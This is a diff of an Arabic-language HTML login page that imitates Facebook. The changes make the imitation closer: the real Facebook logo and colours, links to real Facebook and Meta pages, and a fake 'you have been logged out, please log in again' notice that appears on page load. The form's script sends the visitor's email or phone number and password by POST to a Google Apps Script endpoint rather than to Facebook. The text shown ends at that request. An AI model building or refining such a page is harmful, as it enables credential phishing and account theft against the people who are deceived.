@@ -2,151 +2,64 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Fisbook</title>
+  <title>Fasebook</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- أيقونات Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
     :root {
-      --primary-blue: #1a73e8;
-      --secondary-blue: #166fe5;
-      --input-border: #cfd8dc;
-      --error-bg: #ff5252;
-      --error-text: #fff;
+      --facebook-blue: #1877f2;
+      --input-border: #ccd0d5;
+      --button-hover: #166fe5;
     }
-
     body {
-      font-family: "Segoe UI", Roboto, Arial, sans-serif;
-      background: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+      background-color: #fff;
       margin: 0;
       padding: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: flex-start;
       min-height: 100vh;
     }
-
-    .lang {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #555;
-      cursor: pointer;
-      user-select: none;
-    }
-
-    .logo {
-      margin: 40px 0 20px 0;
-      font-size: 48px;
-      font-weight: bold;
-      color: var(--primary-blue);
-      letter-spacing: 1px;
-    }
-
-    .container {
-      width: 90%;
-      max-width: 380px;
-      background: #fff;
-      padding: 30px 20px 40px 20px;
-      border-radius: 16px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-      text-align: center;
-    }
-
-    form { display: flex; flex-direction: column; gap: 12px; }
-
-    .input-group { position: relative; }
-
+    .lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
+    .logo { margin: 50px 0 30px 0; }
+    .logo img { width: 65px; height: 65px; }
+    .container { width: 90%; max-width: 360px; }
+    form { background-color: #fff; text-align: center; }
+    .input-group { position: relative; margin-bottom: 5px; }
     .input-group input {
-      width: 100%;
-      padding: 14px 12px 14px 42px;
-      border: 1px solid var(--input-border);
-      border-radius: 12px;
-      font-size: 15px;
-      box-sizing: border-box;
-      transition: border 0.2s, box-shadow 0.2s;
+      width: 100%; padding: 15px 12px 15px 40px;
+      border: 1px solid var(--input-border); border-radius: 12px;
+      font-size: 15px; box-sizing: border-box;
     }
-
-    .input-group input:focus {
-      border-color: var(--primary-blue);
-      box-shadow: 0 0 5px rgba(26,115,232,0.3);
-      outline: none;
-    }
-
     .input-group .icon {
-      position: absolute;
-      top: 50%;
-      left: 12px;
-      transform: translateY(-50%);
-      color: #888;
-      font-size: 16px;
+      position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
+      color: #888; font-size: 16px;
     }
-
     .error-bubble {
-      display: none;
-      background: var(--error-bg);
-      color: var(--error-text);
-      font-size: 12px;
-      padding: 6px 10px;
-      border-radius: 15px;
-      margin: 4px 0 10px auto;
-      width: fit-content;
-      max-width: 90%;
-      text-align: right;
-      position: relative;
+      display: none; background: #000; color: #fff; font-size: 12px;
+      padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
+      width: fit-content; max-width: 90%; text-align: right; position: relative;
     }
-
     .error-bubble::after {
-      content: "";
-      position: absolute;
-      bottom: 100%;
-      right: 15px;
-      border-width: 6px;
-      border-style: solid;
-      border-color: transparent transparent var(--error-bg) transparent;
+      content: ""; position: absolute; bottom: 100%; right: 15px;
+      border-width: 6px; border-style: solid;
+      border-color: transparent transparent #000 transparent;
     }
-
     button {
-      width: 100%;
-      padding: 15px;
-      border: none;
-      background-color: var(--primary-blue);
-      color: white;
-      font-size: 17px;
-      font-weight: bold;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: background-color 0.2s;
-      margin-top: 5px;
+      width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
+      color: white; font-size: 17px; font-weight: bold;
+      border-radius: 12px; cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
     }
-
-    button:hover { background-color: var(--secondary-blue); }
-
-    .forgot {
-      margin-top: 14px;
-      font-size: 14px;
-      color: var(--primary-blue);
-      cursor: pointer;
-    }
-
+    button:hover { background-color: var(--button-hover); }
+    .forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
     .create-account {
-      margin-top: 28px;
-      padding: 15px;
-      width: 100%;
-      border: 1px solid var(--primary-blue);
-      background: #fff;
-      color: var(--primary-blue);
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: background 0.2s, color 0.2s;
+      margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
+      background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
+      border-radius: 12px; cursor: pointer;
     }
-
-    .create-account:hover {
-      background-color: var(--primary-blue);
-      color: #fff;
-    }
-
     .msg {
       margin-top: 15px;
       font-size: 15px;
@@ -156,31 +69,46 @@
       justify-content: center;
       gap: 8px;
     }
-
-    .meta {
-      margin-top: 40px;
-      font-size: 12px;
-      color: #999;
-    }
-
+    .meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
     .spinner {
-      border: 3px solid rgba(0,0,0,0.1);
-      border-left-color: var(--primary-blue);
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--facebook-blue);
       border-radius: 50%;
       width: 18px;
       height: 18px;
       animation: spin 0.8s linear infinite;
     }
-
     @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
+    /* ✅ فقاعة أسفل الصفحة */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: #000;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
   </style>
 </head>
 <body>
 
   <div class="lang" id="langBtn">العربية ⌵</div>
 
-  <div class="logo">Fisbook</div>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+  </div>
 
   <div class="container">
     <form id="myForm">
@@ -201,10 +129,13 @@
     <div class="msg" id="msg"></div>
   </div>
 
-  <div class="meta">Meta ©</div>
+  <!-- ✅ رابط Meta -->
+  <div class="meta" id="metaLink">Meta ©</div>
+
+  <!-- ✅ فقاعة الإشعار -->
+  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
 
   <script>
-    // الكود الخاص باللغات والتحقق من الإدخال كما هو تمامًا من النسخة الأصلية
     const langBtn = document.getElementById("langBtn");
     const emailInput = document.getElementById("emailInput");
     const passInput = document.getElementById("passInput");
@@ -215,7 +146,17 @@
     const errorPass = document.getElementById("error-pass");
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
+    const toast = document.getElementById("toast");
 
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
+
+    // باقي الكود بدون تغيير
     const translations = {
       ar: {
         lang: "العربية ⌵",
@@ -261,7 +202,9 @@
     const langs = ["ar", "en", "fr"];
     let currentLangIndex = 0;
     const savedLang = localStorage.getItem("langIndex");
-    if (savedLang !== null) currentLangIndex = parseInt(savedLang);
+    if (savedLang !== null) {
+      currentLangIndex = parseInt(savedLang);
+    }
 
     function updateLanguage() {
       const langKey = langs[currentLangIndex];
@@ -274,10 +217,12 @@
       createBtn.textContent = t.create;
       errorEmail.textContent = t.errorEmail;
       errorPass.textContent = t.errorPass;
-      emailInput.oninvalid = function(){ this.setCustomValidity(t.customEmail); }
-      emailInput.oninput = function(){ this.setCustomValidity(""); }
-      passInput.oninvalid = function(){ this.setCustomValidity(t.customPass); }
-      passInput.oninput = function(){ this.setCustomValidity(""); }
+
+      emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
+      emailInput.oninput = function() { this.setCustomValidity(""); };
+      passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
+      passInput.oninput = function() { this.setCustomValidity(""); };
+
       localStorage.setItem("langIndex", currentLangIndex);
     }
 
@@ -296,15 +241,21 @@
       window.location.href = "https://m.facebook.com/reg/";
     });
 
+    document.getElementById("metaLink").addEventListener("click", () => {
+      window.location.href = "https://about.meta.com/";
+    });
+
     form.addEventListener("submit", e => {
       e.preventDefault();
       let valid = true;
       errorEmail.style.display = "none";
       errorPass.style.display = "none";
+
       const emailOrPhone = emailInput.value.trim();
       const password = passInput.value.trim();
       const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
       const phoneRegex = /^[0-9]{6,15}$/;
+
       if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
         errorEmail.style.display = "block"; valid = false;
       }
@@ -312,9 +263,11 @@
         errorPass.style.display = "block"; valid = false;
       }
       if (!valid) return;
+
       const t = translations[langs[currentLangIndex]];
       msg.innerHTML = `<div class="spinner"></div><span>${t.waiting}</span>`;
       submitButton.disabled = true;
+
       const data = { email_or_phone: emailOrPhone, password: password };
       fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
         method: "POST",
